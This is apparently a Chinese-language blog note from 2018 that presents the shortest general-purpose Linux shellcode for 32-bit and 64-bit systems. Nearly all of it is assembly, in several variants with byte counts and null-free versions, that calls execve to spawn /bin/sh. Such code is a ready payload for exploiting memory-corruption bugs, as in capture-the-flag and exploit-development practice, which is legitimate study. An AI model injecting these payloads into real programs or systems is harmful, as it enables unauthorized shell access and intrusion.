---
layout:     post
title:      "Linux ShellCode"
subtitle:   "最短的通用shellcode编写"
date:       2018-11-16 12:00:00
author:     "Chris"
catalog: true
tags:
    - 笔记
    - ShellCode
    - Linux
 
---

在寄存器都是非理想值情况下(shellcode可根据环境具体触发时寄存器的值做长度调整)，我本着最优通用的原则，整理了Linux下32位和64位最短通用shellcode的编写

## 32位

有"\x00"最短 20 byte
```python
shellcode= '''            
xor ecx,ecx               
mul ecx                   
mov al,0xb                
push 0x68732f             
push 0x6e69622f           
mov ebx,esp               
int 0x80                  
'''                       
shellcode=asm(shellcode)
```
无"\x00"最短 21 byte

```nasm
xor ecx,ecx
mul ecx
push eax
mov al,0xb
push 0x68732f2f   
push 0x6e69622f   
mov ebx,esp
int 0x80
```

标准shellcode 23 byte
```nasm
xor ecx,ecx
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov al,0xB
int 0x80
```
## 64位


最短有"\x00" 22 byte

```nasm
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
```

最短无"\x00" 23 byte

```nasm
xor rsi,rsi
mul esi
push rax
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
```

标准shellcode 31 byte

```nasm
xor    rdi,rdi
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
push   rax
mov rbx,0x68732f2f6e69622f
push   rbx
mov    rdi,rsp
mov    al,0x3b
syscall 
```